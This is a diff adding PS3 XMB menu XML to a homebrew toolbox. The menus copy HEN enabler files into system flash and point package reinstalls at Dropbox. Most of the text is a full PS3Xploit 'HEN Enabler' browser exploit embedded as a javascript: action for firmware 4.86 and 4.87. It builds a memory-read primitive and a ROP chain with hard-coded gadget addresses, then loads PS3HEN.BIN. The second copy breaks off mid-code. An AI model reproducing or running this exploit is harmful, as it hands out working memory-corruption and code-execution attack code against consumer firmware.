+				<Pair key="title"><>Promote HEN Enabler</></Pair>
+				<Pair key="info"><>Install a 4.85 HEN Enabler to the root of the game category</></Pair>
+			</Table>
+			<Table key="hen_485_reinstall">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/package_setup.png</></Pair>
+				<Pair key="title"><>Reinstall HEN</></Pair>
+				<Pair key="info"><>Download and install HEN for 4.85 HFW
+				Note: HEN must be enabled above first</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="hen_485_enabler" attr="hen_485_enabler"/>
+			<Query class="type:x-xmb/folder-pixmap" key="hen_485_enabler_installer" attr="hen_485_enabler_installer" src="#hen_485_enabler_installer_item"/>
+	<!--	<Query class="type:x-xmb/folder-pixmap" key="hen_485_reinstall" attr="hen_485_reinstall" src="#hen_485_reinstall_item"/> -->
+		</Items>
+	</View>
+	
+	<View id="hen_485_enabler_installer_item">
+		<Attributes>
+			<Table key="hen_485_enabler_promoter_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Current HEN Enabler will be overwritten, are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back.
+				
+				This will copy a hen_enabler.xml for 4.85 to dev_flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/hen_enablers/485#/dev_blind/vsh/resource/explore</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/module-action" key="hen_485_enabler_promoter_action" attr="hen_485_enabler_promoter_action" />
+		</Items>
+	</View>
+	
+	<View id="hen_485_reinstall_item">
+		<Attributes>
+			<Table key="hen_485_reinstall_action">
+				<Pair key="info"><>net_package_install</></Pair>
+				<Pair key="pkg_src"><>https://dl.dropboxusercontent.com/</></Pair>
+				<Pair key="pkg_src_qa"><>https://dl.dropboxusercontent.com/</></Pair>
+				<Pair key="content_name"><>msg_install</></Pair>
+				<Pair key="content_id"><>CUSTOM-ULTOOLBOX_00-DEVIL30300000000</></Pair>
+				<Pair key="prod_pict_path"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/download_hen.png</></Pair>
+ 			</Table> 
+		</Attributes> 
+		<Items>
+			<Item class="type:x-xmb/xmlnpsignup" key="hen_485_reinstall_action" attr="hen_485_reinstall_action"/>
+		</Items> 
+	</View>
+	
+	<View id="hen_486_items">
+		<Attributes>
+			<Table key="hen_486_enabler">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/arrow.png</></Pair>
+				<Pair key="title"><>Enable HEN</></Pair>
+				<Pair key="info"><>4.86 HFW Only   </></Pair>
+				<Pair key="module_name"><>webrender_plugin</></Pair>
+				<Pair key="module_action"><>javascript:window.resizeTo(1920,1080);eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,mbytes=1048576,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,stat_size_offset=40,toc_addr=7296336,gadget1_addr=620036,gadget8_addr=131072,gmod1_addr=6352696,gmod2_addr=80756,gmod3_addr=757248,gmod4a_addr=890500,gmod7_addr=108204,gmod8_addr=2862264,gmod4b_addr=4376440,gmod4c_addr=346864,gmod15_addr=3788856,gmod12_addr=6500700,gmod9_addr=68384,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),fail_msg_frag="HEN Exploit initialization failed!",fsopen=801,fsread=802,fswrite=803,fsclose=804,fsstat=808;"4.86"===fwv&&(toc_addr=7296344,gadget1_addr=620036,gadget8_addr=131072,gmod1_addr=6352856,gmod2_addr=80756,gmod3_addr=757248,gmod4a_addr=890500,gmod4b_addr=4376440,gmod4c_addr=346864,gmod7_addr=108204,gmod8_addr=2862264,gmod9_addr=68384,gmod12_addr=6500860,gmod15_addr=3788856);function show(a){document.getElementById("result").innerHTML=a}function scall_r3r5_p2p(a,b,c,d,e,f,g,k,l,h){null===h&&(h=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(a)+hw(l)+hw(g)+hw(f)+hw(e)+fill4(4,dbyte41)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(16,dbyte41)+hdw(d-4)+hdw(gtemp_addr)+fill8(24,dbyte41)+hdw(gmod4c_addr)+fill16(176,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod4b_addr)+fill16(96,dbyte41)+hdw(h)+hdw(sp_exit)+fill8(8,dbyte41)}function load_r3_word_from_ptr_32(a,b,c,d,e,f,g){return hdw(gmod3_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+hdw(a-8)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod15_addr)+fill16(80,dbyte41)+fill8(8,dbyte41)+hdw(b)+hdw(c)+hdw(d)+hdw(e)+hdw(f)+hdw(g)+hdw(sp_exit)+fill8(8,dbyte41)}function h2b(a){return String.fromCharCode(a)}function hw(a){return String.fromCharCode(a\76\7616)+String.fromCharCode(a)}function hdw(a){return hw(0)+hw(a)}String.prototype.toHex16=function(){return("0000"+this).substr(-4)};String.prototype.toAscii=function(a){for(var b="",c=0;c\74this.length;)b=!0===a?b+this.charCodeAt(c).toString(16).toHex16():b+this.charCodeAt(c).toString(16),c+=1;return b};String.prototype.convert=function(a){if(1\76this.length)return"";var b=0,c=[];for(a=!0===a?this:this.toAscii();0!==a.length%4;)a+="00";for("00"!==a.substr(a.length-3,2)&&(a+="0000");b\74a.length;){var d=a.substr(b,4);c.push(String.fromCharCode(parseInt(d,16)));b+=4}return c.join("")};String.prototype.convertedSize=function(a){if(1\76this.length)return 0;for(a=!0===a?this:this.toAscii();0!==a.length%4;)a+="00";"00"!==a.substr(a.length-3,2)&&(a+="0000");return a.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(1===a.length)return a[0];var b="",c=0\76this?"-":"",d=a[0].replace(".","");a=Number(a[1])+1;if(0\76a){for(b=c+"0.";a++;)b+="0";return b+d.replace(/^-/,"")}for(a-=d.length;a--;)b+="0";return d+b};function fromIEEE754(a,b,c){var d=[],e,f;for(e=a.length;e;--e){var g=a[e-1];for(f=8;f;--f)d.push(g%2?1:0),g\76\76=1}d.reverse();f=d.join("");a=(1\74\74b-1)-1;d=parseInt(f.substring(0,1),2)?-1:1;e=parseInt(f.substring(1,1+b),2);f=parseInt(f.substring(1+b),2);return(e===(1\74\74b)-1?0!==f?NaN:Infinity*d:0\74e?d*Math.pow(2,e-a)*(1+f/Math.pow(2,c)):0!==f?f/Math.pow(2,c)*Math.pow(2,-(a-1))*d:0*d).noExponents()}function generateIEEE754(a,b){return fromIEEE754([a\76\7624&255,a\76\7616&255,a\76\768&255,a&255,b\76\7624&255,b\76\7616&255,b\76\768&255,b&255],11,52)}function generateExploit(a,b){return generateIEEE754(a,(a\74\7432|(b\76\761)-1)-a)}function rmem(a,b){document.getElementById("exploit")&&(document.getElementById("exploit").style.src="local("+generateExploit(a,b)+")")}function cmem(a,b,c){if(document.getElementById("exploit"))return rmem(a,b),document.getElementById("exploit").style.src.substr(6,c)}function trigger(a){document.getElementById("trigger")&&(document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")"))}function lc1(){total_loops\74max_loops?t_out=setTimeout(initROP,500,!1):(total_loops=0,show(fail_msg_frag),t_out=0)}function lc2(){total_loops\74max_loops?t_out=setTimeout(initROP2,500,!1):(total_loops=0,show(fail_msg_frag),2,t_out=0)}function findJsVariableOffset(a,b,c,d){rmem(c,d);a=document.getElementById("exploit").style.src.substr(6,d);d=0;for(var e,f;d\742*a.length;){if(a.charCodeAt(d/2)===b.charCodeAt(0)){for(e=f=0;e\742*b.length&&a.charCodeAt((d+e)/2)===b.charCodeAt(e/2);e+=2)f+=1;if(f===b.length){c=c+d+4;for(b=0;b\74offset_array.length;b+=1)if(offset_array[b]===c)return-1;offset_array.push(c);return c}}d+=16}return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,112)}function stack_frame_hookup(){return unescape("\u4141\u2a2f")+hw(gadget1_addr)+hw(toc_addr)+fill16(32,dbyte41)+hdw(toc_addr)+fill16(112,dbyte41)}function scall(a,b,c,d,e,f,g,k,l,h){null===h&&(h=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(a)+hw(l)+hw(g)+hw(f)+hw(e)+hw(d)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(32,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod4a_addr)+fill16(96,dbyte41)+hdw(h)+hdw(sp_exit)+fill8(8,dbyte41)}function callsub(a,b,c,d,e,f,g,k,l,h,p,m,n){null===n&&(n=gtemp_addr);null===m&&(m=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(h)+hw(l)+hw(g)+hw(f)+hw(e)+hw(d)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(32,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(m)+fill16(16,dbyte41)+hdw(a)+fill16(p-32,dbyte00)+hdw(n)+hdw(sp_exit)+fill8(8,dbyte41)}function fillNbytes(a,b,c){var d="",e=0;for(b=h2b(b);e\74a/c;)d+=b.repeat(c/2),e++;return d}function fill4(a,b){return fillNbytes(a,b,4)}function fill8(a,b){return fillNbytes(a,b,8)}function fill16(a,b){return fillNbytes(a,b,16)}function strncmp(a,b,c){a=a.substring(0,c);b=b.substring(0,c);return a==b?0:a\76b?1:-1}function rop_exit_hen(a){a=cmem(2315255808,16,3);a=a.toAscii(!0);0!=strncmp("53434500",a,4)?(show("Failed! Rebooting!"),initROP2(!0)):window.close()}function initROP2(a){try{!0===a&&(total_loops=search_size_ext=search_base_off=frame_fails=0);0!==t_out&&(clearTimeout(t_out),t_out=0);offset_array=[];jump_1_addr=jump_2_addr=stack_frame_addr=0;search_max_threshold=73400320;search_base=2148532224;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;for(stack_frame=stack_frame_hookup()+stack_frame_swap(2315649024);0===stack_frame_addr;){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;0===frame_fails%10&&(search_base_off+=0,search_size_ext+=0);lc2();return}stack_frame=stack_frame.replaceAt(0,h2b(10799));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(-1==stack_frame_addr&&search_max_threshold\74search_size+search_size_ext){frame_fails++;lc2();return}search_max_threshold-=search_size+search_size_ext}for(jump_2=unescape("\u0102\u7efb")+fill16(48,33410)+hw(stack_frame_addr)+unescape("\ufb7e");0===jump_2_addr;){if(search_max_threshold\74search_size){lc2();return}jump_2=jump_2.replaceAt(0,h2b(32507));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(-1==jump_2_addr&&search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}for(jump_1=unescape("\u4141\u7efa")+hw(jump_2_addr)+unescape("\ufa7e");0===jump_1_addr;){if(search_max_threshold\74search_size){lc2();return}jump_1=jump_1.replaceAt(0,h2b(32506));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(-1==jump_1_addr&&search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}var b=cmem(stack_frame_addr-4,32768,stack_frame.length),c=cmem(jump_2_addr-4,4096,jump_2.length),d=cmem(jump_1_addr-4,4096,jump_1.length);c===jump_2&&d===jump_1&&b===stack_frame?(0!==t_out&&clearTimeout(t_out),setTimeout(trigger,1E3,jump_1_addr)):lc2()}catch(e){show("HEN installation failed because the following exception was thrown during execution: "+e+" at: "+e.lineNumber)}}function initROP(a){try{!0===a&&(search_size_ext=search_base_off=frame_fails=0);0!==t_out&&(clearTimeout(t_out),t_out=0);offset_array=[];jump_1_addr=jump_2_addr=stack_frame_addr=xtra_data_addr=0;search_max_threshold=73400320;search_base=2148532224;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;for(xtra_data=start_x.convert()+"/dev_flash/hen/PS3HEN.BIN".convert()+index_key.convert(!0)+unescape("\ufd7e");0===xtra_data_addr;){if(search_max_threshold\74search_size){lc1();return}xtra_data=xtra_data.replaceAt(0,h2b(32509));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}var b=xtra_data_addr+start_x.convertedSize()-4;index_key_addr=b+"/dev_flash/hen/PS3HEN.BIN".convertedSize();for(stack_frame=stack_frame_hookup()+scall(801,b,0,2382364672,0,0,0,0,0)+scall_r3r5_p2p(802,2382364672,2315255808,3145728,2382364680,0,0,0,0,0,0)+stack_frame_swap(2315255808);0===stack_frame_addr;){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;0===frame_fails%10&&(search_base_off+=0,search_size_ext+=0);lc1();return}stack_frame=stack_frame.replaceAt(0,h2b(10799));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(-1==stack_frame_addr&&search_max_threshold\74search_size+search_size_ext){frame_fails++;lc1();return}search_max_threshold-=search_size+search_size_ext}for(jump_2=unescape("\u0102\u7efb")+fill16(48,33410)+hw(stack_frame_addr)+unescape("\ufb7e");0===jump_2_addr;){if(search_max_threshold\74search_size){lc1();return}jump_2=jump_2.replaceAt(0,h2b(32507));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(-1==jump_2_addr&&search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}for(jump_1=unescape("\u4141\u7efa")+hw(jump_2_addr)+unescape("\ufa7e");0===jump_1_addr;){if(search_max_threshold\74search_size){lc1();return}jump_1=jump_1.replaceAt(0,h2b(32506));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(-1==jump_1_addr&&search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}var c=cmem(stack_frame_addr-4,32768,stack_frame.length),d=cmem(xtra_data_addr-4,4096,xtra_data.length),e=cmem(jump_2_addr-4,4096,jump_2.length),f=cmem(jump_1_addr-4,4096,jump_1.length);e===jump_2&&f===jump_1&&d===xtra_data&&c===stack_frame?(0!==t_out&&clearTimeout(t_out),triggerX()):lc1()}catch(g){show("HEN installation failed because the following exception was thrown during execution: "+g+" at: "+g.lineNumber)}}function stack_frame_swap(a){return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+hdw(a)+fill8(8,dbyte41)+hdw(gmod9_addr)}function triggerX(){setTimeout(trigger,1E3,jump_1_addr);setTimeout(rop_exit_hen,4500,"HEN Failed!");total_loops=t_out=0}document.write(\47\74html\76\74head\76\74title\76PS3Xploit - HEN Enabler\74/title\76\74style\76html{left:100%;overflow:hidden;position:relative}input{opacity:0;position:relative;left:-100%}#a{display:table;height:100%;left:-100%;position:relative;width:100%;text-align:center}#b{display:table-cell;vertical-align:middle;width:100%}#result{font-size:20px;font-weight:bold;color:#fff;padding-top:16px}#dot{-webkit-border-radius:180px;background-color:rgba(255,255,255,0.4);width:160px;height:160px;position:relative;display:inline-block}#dot::before,#dot::after{-webkit-border-radius:180px;content:"";width:188px;height:188px;position:absolute;left:-20px;top:-20px;z-index:-1;border:6px solid rgba(255,255,255,0.4);background-color:transparent}#dot::after{width:176px;height:176px;left:-11px;top:-11px;border:3px solid rgba(255,255,255,0.4)}#c{margin-top:62px;left:16px;position:relative}#c div{-webkit-border-radius:8px;position:absolute;background:#fff}#c div:nth-child(1), #c div:nth-child(3), #c div:nth-child(6), #c div:nth-child(8){width:10px;height:40px}#c div:nth-child(2){height:10px;width:24px;left:12px;top:15px}#c div:nth-child(3){left:32px}#c div:nth-child(4){-webkit-border-radius:40px;width:26px;height:26px;left:48px;border:8px solid #fff;background-color:transparent;border-right-color:transparent}#c div:nth-child(5), #c div:nth-child(7){left:100px;top:8px;background-color:transparent;font-size:26px;font-weight:bolder;text-shadow:0px 4px #fff;color:#fff;letter-spacing:-24px}#c div:nth-child(5){left:60px;top:4px;font-size:20px;text-shadow:3px 0px #fff}#c div:nth-child(6){left:88px}#c div:nth-child(8){left:120px}\74/style\76\74/head\76\74body\76\74div id="exploit"\76\74/div\76\74div id="trigger"\76\74/div\76 \74input type="radio" autofocus /\76\74div id="a"\76\74div id="b"\76\74div id="dot"\76\74div id="c"\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\u2571\74/div\76\74div\76\74/div\76\74div\76\u2572\u2572\74/div\76\74div\76\74/div\76\74/div\76\74/div\76\74div id="result"\76\74/div\76\74/div\76\74/div\76\74/body\76\74/html\76\47);setTimeout(function(){initROP(!0)},0);')</></Pair>
+			</Table>
+			<Table key="hen_486_enabler_installer">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Promote HEN Enabler</></Pair>
+				<Pair key="info"><>Install a 4.86 HEN Enabler to the root of the game category</></Pair>
+			</Table>
+			<Table key="hen_486_reinstall">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/package_setup.png</></Pair>
+				<Pair key="title"><>Reinstall HEN</></Pair>
+				<Pair key="info"><>Download and install HEN for 4.86 HFW
+				Note: HEN must be enabled above first</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="hen_486_enabler" attr="hen_486_enabler"/>
+			<Query class="type:x-xmb/folder-pixmap" key="hen_486_enabler_installer" attr="hen_486_enabler_installer" src="#hen_486_enabler_installer_item"/>
+	<!--	<Query class="type:x-xmb/folder-pixmap" key="hen_486_reinstall" attr="hen_486_reinstall" src="#hen_486_reinstall_item"/> -->
+		</Items>
+	</View>
+	
+	<View id="hen_486_enabler_installer_item">
+		<Attributes>
+			<Table key="hen_486_enabler_promoter_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Current HEN Enabler will be overwritten, are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back.
+				
+				This will copy a hen_enabler.xml for 4.86 to dev_flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/hen_enablers/486#/dev_blind/vsh/resource/explore</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/module-action" key="hen_486_enabler_promoter_action" attr="hen_486_enabler_promoter_action" />
+		</Items>
+	</View>
+	
+	<View id="hen_486_reinstall_item">
+		<Attributes>
+			<Table key="hen_486_reinstall_action">
+				<Pair key="info"><>net_package_install</></Pair>
+				<Pair key="pkg_src"><>https://dl.dropboxusercontent.com/</></Pair>
+				<Pair key="pkg_src_qa"><>https://dl.dropboxusercontent.com/</></Pair>
+				<Pair key="content_name"><>msg_install</></Pair>
+				<Pair key="content_id"><>CUSTOM-ULTOOLBOX_00-DEVIL30300000000</></Pair>
+				<Pair key="prod_pict_path"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/download_hen.png</></Pair>
+ 			</Table> 
+		</Attributes> 
+		<Items>
+			<Item class="type:x-xmb/xmlnpsignup" key="hen_486_reinstall_action" attr="hen_486_reinstall_action"/>
+		</Items> 
+	</View>
+	
+	<View id="hen_487_items">
+		<Attributes>
+			<Table key="hen_487_enabler">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/arrow.png</></Pair>
+				<Pair key="title"><>Enable HEN</></Pair>
+				<Pair key="info"><>4.87 HFW Only   </></Pair>
+				<Pair key="module_name"><>webrender_plugin</></Pair>
+				<Pair key="module_action"><>javascript:window.resizeTo(1920,1080);eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,mbytes=1048576,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,stat_size_offset=40,toc_addr=7296336,gadget1_addr=620036,gadget8_addr=131072,gmod1_addr=6352696,gmod2_addr=80756,gmod3_addr=757248,gmod4a_addr=890500,gmod7_addr=108204,gmod8_addr=2862264,gmod4b_addr=4376440,gmod4c_addr=346864,gmod15_addr=3788856,gmod12_addr=6500700,gmod9_addr=68384,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),fail_msg_frag="HEN Exploit initialization failed!",fsopen=801,fsread=802,fswrite=803,fsclose=804,fsstat=808;"4.87"===fwv&&(toc_addr=7296344,gadget1_addr=620036,gadget8_addr=131072,gmod1_addr=6352856,gmod2_addr=80756,gmod3_addr=757248,gmod4a_addr=890500,gmod4b_addr=4376440,gmod4c_addr=346864,gmod7_addr=108204,gmod8_addr=2862264,gmod9_addr=68384,gmod12_addr=6500860,gmod15_addr=3788856);function show(a){document.getElementById("result").innerHTML=a}function scall_r3r5_p2p(a,b,c,d,e,f,g,k,l,h){null===h&&(h=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(a)+hw(l)+hw(g)+hw(f)+hw(e)+fill4(4,dbyte41)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(16,dbyte41)+hdw(d-4)+hdw(gtemp_addr)+fill8(24,dbyte41)+hdw(gmod4c_addr)+fill16(176,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod4b_addr)+fill16(96,dbyte41)+hdw(h)+hdw(sp_exit)+fill8(8,dbyte41)}function load_r3_word_from_ptr_32(a,b,c,d,e,f,g){return hdw(gmod3_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+hdw(a-8)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod15_addr)+fill16(80,dbyte41)+fill8(8,dbyte41)+hdw(b)+hdw(c)+hdw(d)+hdw(e)+hdw(f)+hdw(g)+hdw(sp_exit)+fill8(8,dbyte41)}function h2b(a){return String.fromCharCode(a)}function hw(a){return String.fromCharCode(a\76\7616)+String.fromCharCode(a)}function hdw(a){return hw(0)+hw(a)}String.prototype.toHex16=function(){return("0000"+this).substr(-4)};String.prototype.toAscii=function(a){for(var b="",c=0;c\74this.length;)b=!0===a?b+this.charCodeAt(c).toString(16).toHex16():b+this.charCodeAt(c).toString(16),c+=1;return b};String.prototype.convert=function(a){if(1\76this.length)return"";var b=0,c=[];for(a=!0===a?this:this.toAscii();0!==a.length%4;)a+="00";for("00"!==a.substr(a.length-3,2)&&(a+="0000");b\74a.length;){var d=a.substr(b,4);c.push(String.fromCharCode(parseInt(d,16)));b+=4}return c.join("")};String.prototype.convertedSize=function(a){if(1\76this.length)return 0;for(a=!0===a?this:this.toAscii();0!==a.length%4;)a+="00";"00"!==a.substr(a.length-3,2)&&(a+="0000");return a.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(1===a.length)return a[0];var b="",c=0\76this?"-":"",d=a[0].replace(".","");a=Number(a[1])+1;if(0\76a){for(b=c+"0.";a++;)b+="0";return b+d.replace(/^-/,"")}for(a-=d.length;a--;)b+="0";return d+b};function fromIEEE754(a,b,c){var d=[],e,f;for(e=a.length;e;--e){var g=a[e-1];for(f=8;f;--f)d.push(g%2?1:0),g\76\76=1}d.reverse();f=d.join("");a=(1\74\74b-1)-1;d=parseInt(f.substring(0,1),2)?-1:1;e=parseInt(f.substring(1,1+b),2);f=parseInt(f.substring(1+b),2);return(e===(1\74\74b)-1?0!==f?NaN:Infinity*d:0\74e?d*Math.pow(2,e-a)*(1+f/Math.pow(2,c)):0!==f?f/Math.pow(2,c)*Math.pow(2,-(a-1))*d:0*d).noExponents()}function generateIEEE754(a,b){return fromIEEE754([a\76\7624&255,a\76\7616&255,a\76\768&255,a&255,b\76\7624&255,b\76\7616&255,b\76\768&255,b&255],11,52)}function generateExploit(a,b){return generateIEEE754(a,(a\74\7432|(b\76\761)-1)-a)}function rmem(a,b){document.getElementById("exploit")&&(document.getElementById("exploit").style.src="local("+generateExploit(a,b)+")")}function cmem(a,b,c){if(document.getElementById("exploit"))return rmem(a,b),document.getElementById("exploit").style.src.substr(6,c)}function trigger(a){document.getElementById("trigger")&&(document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")"))}function lc1(){total_loops\74max_loops?t_out=setTimeout(initROP,500,!1):(total_loops=0,show(fail_msg_frag),t_out=0)}function lc2(){total_loops\74max_loops?t_out=setTimeout(initROP2,500,!1):(total_loops=0,show(fail_msg_frag),2,t_out=0)}function findJsVariableOffset(a,b,c,d){rmem(c,d);a=document.getElementById("exploit").style.src.substr(6,d);d=0;for(var e,f;d\742*a.length;){if(a.charCodeAt(d/2)===b.charCodeAt(0)){for(e=f=0;e\742*b.length&&a.charCodeAt((d+e)/2)===b.charCodeAt(e/2);e+=2)f+=1;if(f===b.length){c=c+d+4;for(b=0;b\74offset_array.length;b+=1)if(offset_array[b]===c)return-1;offset_array.push(c);return c}}d+=16}return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,112)}function stack_frame_hookup(){return unescape("\u4141\u2a2f")+hw(gadget1_addr)+hw(toc_addr)+fill16(32,dbyte41)+hdw(toc_addr)+fill16(112,dbyte41)}function scall(a,b,c,d,e,f,g,k,l,h){null===h&&(h=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(a)+hw(l)+hw(g)+hw(f)+hw(e)+hw(d)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(32,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod4a_addr)+fill16(96,dbyte41)+hdw(h)+hdw(sp_exit)+fill8(8,dbyte41)}function callsub(a,b,c,d,e,f,g,k,l,h,p,m,n){null===n&&(n=gtemp_addr);null===m&&(m=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(h)+hw(l)+hw(g)+hw(f)+hw(e)+hw(d)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(32,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(m)+fill16(16,dbyte41)+hdw(a)+fill16(p-32,dbyte00)+hdw(n)+hdw(sp_exit)+fill8(8,dbyte41)}function fillNbytes(a,b,c){var d="",e=0;for(b=h2b(b);e\74a/c;)d+=b.repeat(c/2),e++;return d}function fill4(a,b){return fillNbytes(a,b,4)}function fill8(a,b){return fillNbytes(a,b,8)}function fill16(a,b){return fillNbytes(a,b,16)}function strncmp(a,b,c){a=a.substring(0,c);b=b.substring(0,c);return a==b?0:a\76b?1:-1}function rop_exit_hen(a){a=cmem(2315255808,16,3);a=a.toAscii(!0);0!=strncmp("53434500",a,4)?(show("Failed! Rebooting!"),initROP2(!0)):window.close()}function 